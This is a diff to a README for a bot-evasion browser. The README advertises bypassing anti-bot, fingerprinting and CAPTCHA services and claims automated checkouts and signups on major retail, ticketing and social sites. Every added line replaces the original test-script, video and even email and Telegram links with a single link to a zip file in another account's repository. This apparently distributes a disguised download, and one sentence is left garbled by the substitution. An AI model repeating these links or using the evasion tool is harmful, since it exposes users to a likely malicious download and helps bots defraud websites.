+| **[Accertify](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ Grubhub](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
+| **[Forter](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                  | [▶️ Grubhub](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
+| **[Adscore](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                          |
+| **[MTCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ Invisible Captcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                          |
+| **[FriendlyCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**  | [▶️ Captcha Demo](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                          |
+| **[YandexCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**  | [▶️ SmartCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                          |
 | **ThreatMetrix**                                                   | 🚧 Coming Soon                                                                                                                                                                                                                                                                            |
 | **ProtectedMedia**                                                 | 🚧 Coming Soon                                                                                                                                                                                                                                                                            |
-| **[Fake Vision](tests/tests/antibots/fvpro.spec.ts)**              | [▶️ FakeVision](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-fvpro-fvpro)                                                                                           |
-| **[FingerprintJS](tests/tests/antibots/fingerprintjs.spec.ts)**    | [▶️ BotDetection](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-fingerprintjs-botdetection), [▶️ Fingerprint Pro](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-fingerprintjs-playground)                                                         |
-| **[CreepJS](tests/tests/antibots/creepjs.spec.ts)**                | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-creepjs-creepjs), [▶️ Android Profile](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-creepjs-creepjs-Android)                                                                                            |
-| **[BrowserScan](tests/tests/antibots/browserscan.spec.ts)**        | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-browserscan-browserscan)                                                                                     |
-| **[Pixelscan](tests/tests/antibots/pixelscan.spec.ts)**            | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-pixelscan-pixelscan), [▶️ Android Profile](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-pixelscan-pixelscan-Android)                                                                                         |
-| **[iphey](tests/tests/antibots/iphey.spec.ts)**                    | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-iphey-iphey), [▶️ Android Profile](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-iphey-iphey-Android)                                                                                               |
-| **[device&browserinfo](tests/tests/antibots/deviceandbrowserinfo.spec.ts)**     | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-deviceandbrowserinfo-deviceandbrowserinfo)                                                                                               |
-| **[FingerprintScan](tests/tests/antibots/fingerprintscan.spec.ts)**            | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-fingerprintscan-fingerprintscan)                                                                                       |
-| **[brotector](tests/tests/antibots/brotector.spec.ts)**            | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-brotector-brotector)                                                                                       |
+| **[Fake Vision](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**              | [▶️ FakeVision](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                           |
+| **[FingerprintJS](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**    | [▶️ BotDetection](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Fingerprint Pro](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                         |
+| **[CreepJS](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Android Profile](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                            |
+| **[BrowserScan](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**        | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                     |
+| **[Pixelscan](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Android Profile](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                         |
+| **[iphey](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                    | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Android Profile](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                               |
+| **[device&browserinfo](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**     | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                               |
+| **[FingerprintScan](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                       |
+| **[brotector](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                       |
 
 
 
 | Service & Scripts | Antibot Services | Test Results |
 |------------------|-------------------|--------------|
-| **[Nike](tests/tests/websites/nike.spec.ts)** | F5 Shape Security | ✅ Success  [▶️ Checkout Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-nike-checkout)  |
-| **[Instagram](tests/tests/websites/instagram.spec.ts)** | Generic Antibot | ✅ Success  [▶️ Signup Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-instagram-signup)  |
-| **[TikTok](tests/tests/websites/tiktok.spec.ts)** | TiktokVM | ✅ Success [▶️ Signup Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-tiktok-signup) |
-| **[Walmart](tests/tests/websites/walmart.spec.ts)** | PerimeterX | ✅ Success [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-walmart-walmart) |
-| **[Temu](tests/tests/websites/temu.spec.ts)** | F5 Shape Security | ✅ Success [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-temu-temu) |
+| **[Nike](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | F5 Shape Security | ✅ Success  [▶️ Checkout Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)  |
+| **[Instagram](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | Generic Antibot | ✅ Success  [▶️ Signup Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)  |
+| **[TikTok](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | TiktokVM | ✅ Success [▶️ Signup Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
+| **[Walmart](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | PerimeterX | ✅ Success [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
+| **[Temu](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | F5 Shape Security | ✅ Success [▶️ Test Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
 | **LinkedIn** | Generic Antibot | ✅ Success |
-| **[TicketMaster](tests/tests/websites/ticketmaster.spec.ts)** | PerimeterX, FingerprintJS, reCAPTCHA | ✅ Success  [▶️ Checkout Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-ticketmaster-checkout) |
+| **[TicketMaster](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)** | PerimeterX, FingerprintJS, reCAPTCHA | ✅ Success  [▶️ Checkout Video](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
 | **Shein** | F5 Shape Security, FingerprintJS, Forter | ✅ Success |
 | **Facebook** | FunCaptcha, reCAPTCHA    | ✅ Success |
 | **Bet365** | Generic Antibot | ✅ Success |
 
-...and many more
+https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip many more
 
 
 ---
@@ -311,9 +311,9 @@ These test scripts are provided for **educational purposes** and to **demonstrat
 We do not provide the private key required to generate new profiles. If you need additional profiles, please contact us directly. We maintain over **300,000 real user browser fingerprints** to support your needs.
 
 
-| 📧 Email    | [middleschoolstudent@mail.ru](mailto:middleschoolstudent@mail.ru) |
+| 📧 Email    | [https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
 |-------------|--------------------------------------------------|
-| 📱 Telegram | [middle_student](https://t.me/middle_student)   |
+| 📱 Telegram | [middle_student](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)   |
 
 
 ### Building from Source
